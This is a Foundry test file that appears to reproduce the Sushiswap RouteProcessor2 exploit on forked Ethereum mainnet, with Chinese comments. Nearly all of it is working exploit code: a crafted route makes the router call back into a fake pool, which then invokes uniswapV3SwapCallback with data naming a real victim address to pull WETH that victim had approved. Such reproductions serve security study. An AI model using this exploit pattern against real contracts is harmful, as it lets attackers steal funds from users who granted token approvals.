// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/console.sol";
import "forge-std/Test.sol";
import "../interface.sol";
import "src/defisec/Log.sol";
/*
https://explorer.phalcon.xyz/tx/eth/0x3610d3e3f2381c73f4bd128df9be90de87482802f30712dd555619b8bf3462a4
https://vscode.blockscan.com/ethereum/0x044b75f554b886a065b9567891e45c79542d7357


*/
// forge test --contracts ./src/defisec/dex/Sushiswap_exp.sol -vv  (vv只打印log不打印trace)
interface IUniswapV3Pool {
    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bytes calldata data
    ) external returns (int256 amount0, int256 amount1);
}

interface IRouteProcessor2 {
    function processRoute(
        address tokenIn,
        uint256 amountIn,
        address tokenOut,
        uint256 amountOutMin,
        address to,
        bytes memory route
    ) external payable returns (uint256 amountOut);

    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external;

    function tridentCLSwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external;
}
//original route 0x01514910771af9ca656af840dff83e8264ecf986ca01000001f9a001d5b2c7c5e45693b41fcf931b94e680cac4000000000000000000000000000000000000000000
// my route      0x01514910771af9ca656af840dff83e8264ecf986ca010000017fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000

contract SushiExp is Test, IUniswapV3Pool {
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 LINK = IERC20(0x514910771AF9Ca656af840dff83E8264EcF986CA);
    address victim = 0x31d3243CfB54B34Fc9C73e1CB1137124bD6B13E1;
    IRouteProcessor2 processor = IRouteProcessor2(0x044b75f554b886A065b9567891e45c79542d7357);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("mainnet", 17_007_841);

        cheats.label(address(WETH), "WETH");
        cheats.label(address(LINK), "LINK");
    }

    function testExp() external {
        uint8 commandCode = 1;
        uint8 num = 1;
        uint16 share = 0;
        uint8 poolType = 1;
        address pool = address(this);
        uint8 zeroForOne = 0;
        address recipient = address(0);
        bytes memory route =
                            abi.encodePacked(commandCode, address(LINK), num, share, poolType, pool, zeroForOne, recipient);
        console.log("WETH balance before attack: %d\n", WETH.balanceOf(address(this)));

        processor.processRoute(
            0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE, //native token
            0,
            0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE,
            0,
            0x0000000000000000000000000000000000000000,
            route
        );

        console.log("WETH balance after  attack: %d\n", WETH.balanceOf(address(this)));
    }

    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bytes calldata data
    ) external returns (int256 amount0, int256 amount1) {
        amount0 = 0;
        amount1 = 0;
        //意外的发现转走的不是router的钱。router没钱。
        //大冤种A之前授权给了router，router把大冤种A的钱转给了攻击者。
        bytes memory malicious_data = abi.encode(address(WETH), victim);
        processor.uniswapV3SwapCallback(100 * 10 ** 18, 0, malicious_data);
    }
}
